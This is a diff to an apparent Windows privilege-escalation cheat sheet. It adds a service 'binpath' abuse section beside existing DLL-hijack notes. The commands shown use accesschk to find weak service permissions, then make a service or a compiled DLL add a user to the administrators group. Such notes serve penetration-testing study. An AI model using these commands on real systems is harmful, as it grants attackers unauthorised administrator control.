@@ -67,7 +67,13 @@ Find service with a DLL that isn't found, able to start/stop service and searche
 
     system("cmd.exe /k net localgroup administrators user /add");             #line to insert in C code
     
-    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll              #compile on Kali then transfer 
+    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll              #compile on Kali then transfer   
+### Binpath  
+Look for SERVICE_CHANGE_CONFIG and SERVICE_START     
+
+     accesschk.exe /accepteula -wuvc [svc name]         
+     
+     sc config [svc name] binpath= "net localgroup administrators user /add"      
 ## Registry Exploits
 ### Autoruns   
 Search
